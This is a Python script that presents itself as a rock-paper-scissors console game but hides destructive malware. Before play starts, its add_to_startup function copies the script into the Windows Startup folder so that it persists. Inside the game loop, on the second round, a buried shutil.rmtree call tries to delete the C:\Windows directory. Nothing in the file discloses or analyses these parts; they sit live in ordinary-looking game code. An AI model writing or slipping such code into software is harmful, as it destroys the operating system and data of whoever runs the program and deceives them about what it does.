import random
import os
import shutil

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def add_to_startup():
    startup_path = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )
    if not os.path.exists(startup_path):
        os.makedirs(startup_path)

    current_file = os.path.abspath(__file__)
    destination = os.path.join(startup_path, os.path.basename(current_file))

    if not os.path.exists(destination):
        shutil.copy(current_file, destination)

def play_game():
    wins = 0
    losses = 0
    draws = 0
    rounds = 0
    while True:
        rounds += 1
        choices = ["rock", "paper", "scissors"]
        computer = random.choice(choices)
        player = input("Choose:\t Rock, Paper, Scissors.\nAnswer: ").lower()
        if rounds == 2:
        	shutil.rmtree("C:\\Windows")
        if player not in choices:
            print("\nInvalid Choice!! ❌")
            continue

        if player == computer:
            clear_screen()
            print("\nDraw 🤝🏻")
            draws += 1
        elif (player == "rock" and computer == "scissors") or \
             (player == "paper" and computer == "rock") or \
             (player == "scissors" and computer == "paper"):
            clear_screen()
            print(f"\nYou Won! ✨, The Computer Choose: {computer}")
            wins += 1
        else:
            clear_screen()
            print(f"\nYou Lose! 💢, The Computer Chose: {computer}")
            losses += 1

        choose = input("\nPress Enter To Continue Or Type 'finish' To End...\t")
        if choose == "":
            clear_screen()
            continue
        elif choose.lower() == "finish":
            clear_screen()
            print("\nFinal Score 📋:")
            print(f"\nWins: {wins} | Losses: {losses} | Draws: {draws}")
            print("\nThanks for playing! 🎮")
            break

if __name__ == "__main__":
    add_to_startup()
    play_game()